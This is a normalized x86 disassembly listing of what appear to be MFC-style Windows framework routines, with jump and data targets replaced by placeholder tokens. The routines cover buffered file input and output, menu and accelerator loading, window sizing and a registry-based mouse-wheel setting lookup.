push eax
call sub_42fb3d
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_42f9d9
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_42ded6
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_447b03
mov eax sub_464187
call sub_42dc88
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ ebx ]
push edi
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x10 ] esi
push ecx
mov ecx ebx
call [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
or [ esi + 0xc ] 0xffffffff
push 0x1
mov [ esi + 0x14 ] ecx
pop eax
xor edi edi
not ecx
test al cl
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ebx
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi + 0x3c ] 0x40
mov [ esi + 0x3c ] 0x10
jmp r-xdata
mov [ esi + 0x1c ] ecx
mov [ esi + 0x1c ] eax
mov [ esi + 0x2c ] edi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x2c ] ecx
mov ecx [ ebp + 0x10 ]
mov eax 0x80
mov [ esi + 0x40 ] 0x89
cmp ecx eax
mov [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ ebp + 0x10 ]
add ecx eax
test [ esi + 0x14 ] 0x1
mov [ esi + 0x28 ] ecx
je r-xdata
mov eax [ ebx ]
push edi
push edi
push edi
push 0x3
mov ecx ebx
call [ eax + 0x50 ]
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
mov eax [ esi + 0x1c ]
cmp [ esi + 0x2c ] edi
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x24 ] eax
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax ecx
mov [ ebp + 0x10 ] edi
push [ esi + 0x1c ]
call sub_441e89
pop ecx
mov [ esi + 0x2c ] eax
mov [ esi + 0x18 ] edi
jmp r-xdata
sub_447bdf
mov eax sub_46419f
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx esi
call sub_447c25
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
test [ esi + 0x14 ] 0x2
jne r-xdata
call sub_447c67
sub_447c25
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x18 ] edi
mov [ esi + 0x20 ] edi
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx edi
je r-xdata
push [ esi + 0x2c ]
call sub_441eb2
pop ecx
mov [ esi + 0x2c ] edi
mov [ esi + 0x24 ] edi
mov ecx [ esi + 0x34 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ esi + 0x34 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_447c75
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x24 ]
push edi
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_42e2d0
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0xc ]
pop edi
sub eax ebx
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov edi ebx
sub edi edx
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] edi
sub ebx [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x34 ]
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
test eax eax
jbe r-xdata
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x0
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
cmp ebx eax
ja r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_42e2d0
add [ esi + 0x24 ] edi
add esp 0xc
sub ebx edi
mov edi ebx
mov eax [ esi + 0x2c ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x2c ]
mov [ esi + 0x24 ] eax
lea ecx [ eax + edi ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
cmp edi ebx
jb r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp - 0x8 ]
call [ eax + 0x34 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_447d84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x24 ]
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_42e2d0
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
mov ecx esi
call sub_447e14
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
mov edi ebx
mov eax [ ecx ]
sub edi edx
push edi
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
add [ ebp + 0x8 ] edi
sub ebx edi
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x24 ]
call sub_42e2d0
add esp 0xc
add [ esi + 0x24 ] ebx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x1
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
sub_447e14
push esi
mov esi ecx
push edi
test [ esi + 0x14 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov edx [ esi + 0x2c ]
push ebx
xor ebx ebx
cmp [ esi + 0x8 ] ebx
lea edi [ esi + 0x2c ]
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ esi + 0x24 ]
cmp edx eax
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
mov eax [ esi + 0x28 ]
mov [ esi + 0x24 ] eax
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub eax edx
push 0x1
push eax
mov edi [ ecx ]
call [ edi + 0x28 ]
mov ecx [ esi + 0x20 ]
lea edx [ esi + 0x28 ]
push edx
push edi
push [ esi + 0x1c ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x50 ]
mov ecx [ esi + 0x20 ]
push ebp
push ebx
sub eax edx
mov ebp [ ecx ]
push ebx
push eax
push 0x2
call [ ebp + 0x50 ]
pop ebp
mov eax [ edi ]
pop ebx
mov [ esi + 0x24 ] eax
mov ecx [ esi + 0x20 ]
sub eax edx
push eax
push edx
mov ebx [ ecx ]
call [ ebx + 0x38 ]
jmp r-xdata
pop edi
pop esi
retn
sub_447e90
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
mov eax [ ebp + 0x8 ]
push edi
mov ecx [ esi + 0x24 ]
mov edi [ esi + 0x28 ]
lea ebx [ esi + 0x28 ]
sub edi ecx
add eax edi
cmp [ esi + 0x8 ] 0x0
mov [ ebp - 0x8 ] eax
jne r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x2c ]
cmp ecx eax
jbe r-xdata
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x2c ]
push ebx
push edi
push [ esi + 0x1c ]
mov eax [ ecx ]
push 0x0
call [ eax + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
mov ecx [ esi + 0x20 ]
push 0x1
neg edi
mov eax [ ecx ]
push edi
call [ eax + 0x28 ]
mov eax [ esi + 0x28 ]
pop edi
sub eax [ esi + 0x24 ]
pop esi
pop ebx
cmp eax [ ebp - 0x8 ]
jae r-xdata
test edi edi
jle r-xdata
leave
retn 0x4
push 0x0
push 0x3
call sub_448643
mov ebx [ esi + 0x1c ]
mov [ ebp - 0x4 ] edi
sub ebx edi
add edi eax
push edi
push ecx
push eax
call sub_42ea90
mov eax [ esi + 0x2c ]
add esp 0xc
mov [ esi + 0x24 ] eax
lea ecx [ eax + edi ]
mov [ ebx ] ecx
mov eax [ esi + 0x2c ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x24 ] eax
add eax ecx
mov [ esi + 0x28 ] eax
jmp r-xdata
test ebx ebx
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov ecx [ esi + 0x20 ]
push ebx
push edi
mov eax [ ecx ]
call [ eax + 0x34 ]
add [ ebp - 0x4 ] eax
add edi eax
sub ebx eax
test eax eax
jbe r-xdata
sub_447f52
push esi
push edi
mov edi [ esp + 0xc ]
mov eax 0xffff
cmp edi eax
mov esi ecx
jae r-xdata
push eax
mov ecx esi
call sub_4268e3
push edi
mov ecx esi
call sub_4256e9
push edi
call sub_4268e3
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_447f80
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x2 ]
push esi
mov esi ecx
push eax
call sub_42690a
cmp [ ebp - 0x2 ] 0xffff
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_42570f
mov eax [ ebp - 0x8 ]
movzx eax [ ebp - 0x2 ]
jmp r-xdata
pop esi
leave
retn
sub_447fb0
push ebp
mov ebp esp
sub esp 0x314
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
cmp [ eax ] 0x22
mov esi [ ecx + 0x8 ]
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov edi 0x104
push edi
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpynA@IAT ]
lea eax [ ebp - 0x210 ]
push 0x22
push eax
call sub_42edc5
pop ecx
test eax eax
pop ecx
je r-xdata
inc eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call sub_4447b8
lea eax [ ebp - 0x314 ]
push edi
push eax
lea eax [ ebp - 0x10c ]
push eax
call sub_420710
push eax
call sub_444696
test eax eax
je r-xdata
and [ eax ] 0x0
test esi esi
je r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
call [ lstrcpyA@IAT ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax esi
mov esi [ esi ]
lea ecx [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
push ecx
lea ecx [ ebp - 0x10c ]
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x68 ]
cmp eax ebx
jle r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x60 ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
cmp eax 0x5
jne r-xdata
mov ebx eax
mov [ ebp - 0x8 ] edi
mov eax [ ecx ]
lea edx [ ebp - 0x10c ]
push 0x1
push edx
call [ eax + 0x80 ]
push 0xffffffff
push ecx
push 0xf101
call sub_4496ef
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x64 ]
mov ecx eax
call sub_43fcfb
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x1c ]
cmp esi ecx
je r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xcc ]
mov eax [ ecx ]
push 0xffffffff
call [ eax + 0xcc ]
sub_4480f1
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ecx + 0x8 ]
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn
push edi
test esi esi
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx edi
call [ eax + 0x58 ]
test eax eax
je r-xdata
mov eax esi
mov esi [ esi ]
mov edi [ eax + 0x8 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc ebx
sub_448137
mov eax sub_46447d
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_44195c
mov eax [ rw-data ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x40 ] edi
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4c ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x50 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x54 ] eax
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
cmp [ rw-data ] edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx esi
mov [ esi + 0x1c ] 0x1
call sub_448234
mov [ esi + 0x1c ] edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push 0x1c
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx [ rw-data ]
push esi
call sub_43cef0
jmp r-xdata
push 0x20
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push 0xa
call sub_43cdcd
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
xor eax eax
call sub_4559ad
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x1
mov [ rw-data ] eax
sub_448234
push ebx
push ebp
push esi
mov esi ecx
xor ebp ebp
push edi
mov eax [ esi + 0x60 ]
lea ecx [ esi + 0x60 ]
cmp [ eax - 0x8 ] ebp
jne r-xdata
cmp [ esi + 0x44 ] ebp
mov edi [ LoadMenuA@IAT ]
mov ebx [ LoadAcceleratorsA@IAT ]
je r-xdata
push [ esi + 0x3c ]
call sub_4437c6
cmp [ esi + 0x40 ] ebp
je r-xdata
cmp [ esi + 0x2c ] ebp
jne r-xdata
cmp [ esi + 0x48 ] ebp
je r-xdata
cmp [ esi + 0x34 ] ebp
jne r-xdata
call sub_45357b
mov ebp [ eax + 0xc ]
movzx eax [ esi + 0x44 ]
push eax
push ebp
call edi
mov [ esi + 0x2c ] eax
movzx eax [ esi + 0x44 ]
push eax
push ebp
call ebx
mov [ esi + 0x30 ] eax
xor ebp ebp
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ esi + 0x24 ] ebp
jne r-xdata
call sub_45357b
mov ebp [ eax + 0xc ]
movzx eax [ esi + 0x40 ]
push eax
push ebp
call edi
mov [ esi + 0x34 ] eax
movzx eax [ esi + 0x40 ]
push eax
push ebp
call ebx
mov [ esi + 0x38 ] eax
xor ebp ebp
call sub_45357b
mov ebp [ eax + 0xc ]
movzx eax [ esi + 0x48 ]
push eax
push ebp
call edi
mov [ esi + 0x24 ] eax
movzx eax [ esi + 0x48 ]
push eax
push ebp
call ebx
mov [ esi + 0x28 ] eax
sub_4482dc
mov eax sub_464490
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov eax [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
mov edi [ DestroyMenu@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call edi
lea ecx [ esi + 0x60 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push eax
call edi
sub_448362
mov eax sub_4644a4
call sub_42dc88
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
and [ ebx ] 0x0
push edi
mov eax [ esi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0xc ]
push 0x4
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
push [ ebp + 0x8 ]
mov edi eax
mov eax [ edi + 0x20 ]
push eax
call sub_44494e
test eax eax
jne r-xdata
push 0x3
mov eax [ ebp + 0xc ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
push 0x5
mov [ ebx ] edi
pop eax
jmp r-xdata
cmp [ ebp - 0x10 ] eax
jne r-xdata
push 0x2e
push [ ebp + 0x8 ]
call sub_42edc5
pop ecx
test eax eax
pop ecx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push 0x4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
pop esi
lea ecx [ ebp + 0xc ]
call sub_442148
mov eax esi
sub_448417
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
call sub_442eec
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x5c ]
mov eax edi
sub_44843e
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push 0x14
lea eax [ ebp - 0x14 ]
push 0x0
mov esi ecx
push eax
call sub_42dc30
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x50 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x54 ]
add esp 0xc
mov [ ebp - 0x14 ] eax
test ecx ecx
mov [ ebp - 0xc ] esi
jne r-xdata
call sub_442eec
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x14 ]
push ecx
push 0x0
push 0xcf8000
mov ecx edi
push [ esi + 0x3c ]
call [ eax + 0xb8 ]
neg eax
sbb eax eax
and eax edi
pop edi
pop esi
leave
retn 0x8
sub_4484bb
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
push 0x1
pop eax
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
leave
retn
sub_4484f7
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
pop esi
leave
retn 0x4
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_448527
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
pop esi
leave
retn
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xac ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_448558
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi + 0x20 ]
push r--data
call sub_442ecc
cmp [ ebp + 0xc ] 0xfffffffc
pop ecx
pop ecx
jne r-xdata
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441aa8
test eax eax
je r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push 0xfffffffc
push [ ebp + 0x8 ]
call [ edx + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x10
sub_4485a3
mov eax sub_46495c
call sub_42dc88
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1b0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0xc ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_441ebd
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44af4d
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_4437c6
sub_448643
mov eax sub_464984
call sub_42dc88
push ecx
push ecx
push esi
push 0x10
call sub_441e89
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_442f71
mov eax [ rw-data ]
lea ecx [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
call sub_4422d1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_42dca7
pop esi
mov eax r--data
retn
sub_4486ae
push ebp
mov ebp esp
sub esp 0x8c
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] si
mov [ rw-data ] 0x1
jne r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
push r--data
call [ RegisterWindowMessageA@IAT ]
cmp eax esi
mov [ rw-data ] eax
jne r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] 0x3
jne r-xdata
push r--data
push r--data
call [ FindWindowA@IAT ]
cmp eax esi
je r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
cmp [ rw-data ] esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push esi
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
cmp ecx esi
je r-xdata
push esi
push rw-data
push esi
push 0x68
call [ SystemParametersInfoA@IAT ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x80
push eax
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0xc ]
push eax
push esi
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push ecx
push eax
call [ SendMessageA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0xa
lea eax [ ebp - 0x8c ]
push esi
push eax
call sub_42ea75
add esp 0xc
mov [ rw-data ] eax
pop esi
leave
retn
sub_4487eb
push esi
push edi
mov esi ecx
call sub_4465f9
lea edi [ esi + 0x40 ]
push 0x2c
push 0x0
push edi
mov [ esi ] r--data
call sub_42dc30
and [ edi ] 0x0
add esp 0xc
mov eax esi
pop edi
pop esi
retn
sub_448839
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ esi + 0x40 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ edi ]
push 0x8
mov ecx edi
call [ eax + 0x34 ]
mov ecx [ esi + 0x48 ]
mov eax [ esi + 0x44 ]
mov edx [ edi ]
push ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call [ edx + 0x48 ]
mov ecx [ esi + 0x50 ]
mov eax [ esi + 0x4c ]
mov edx [ edi ]
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
call [ edx + 0x40 ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x34 ]
jmp r-xdata
mov eax [ edi ]
push ebx
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx edi
call [ eax + 0x38 ]
push [ ebp + 0xc ]
mov ecx esi
push edi
call sub_446a9a
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_448ad5
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
neg ecx
neg eax
cmp [ esi + 0x64 ] 0x0
mov [ ebp - 0x8 ] ecx
mov ebx eax
je r-xdata
xor ebx ebx
cmp [ edi + 0xc ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x4c ]
sub eax [ ebp - 0x18 ]
cmp ecx eax
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ esi + 0x50 ]
sub eax [ ebp - 0x14 ]
cmp ecx eax
jge r-xdata
mov eax [ ebp - 0x10 ]
sub eax ecx
sub eax [ ebp - 0x18 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
sub eax ecx
sub eax [ ebp - 0x14 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
sub_448918
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
xor edi edi
or [ esi + 0x40 ] 0xffffffff
cmp [ esi + 0x1c ] edi
mov [ esi + 0x44 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x48 ] eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
cmp [ esi + 0x1c ] edi
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] ecx
je r-xdata
call sub_44163f
test eax 0x300000
je r-xdata
pop edi
pop esi
leave
retn 0x8
mov ecx esi
call sub_448df8
push 0x1
push edi
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
push 0x1
push edi
push edi
mov ecx esi
call sub_43ffc9
push 0x1
push edi
push 0x1
mov ecx esi
call sub_43ffc9
push edi
push 0x3
mov ecx esi
call sub_440084
sub_4489a3
mov eax sub_464a04
call sub_42dc88
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
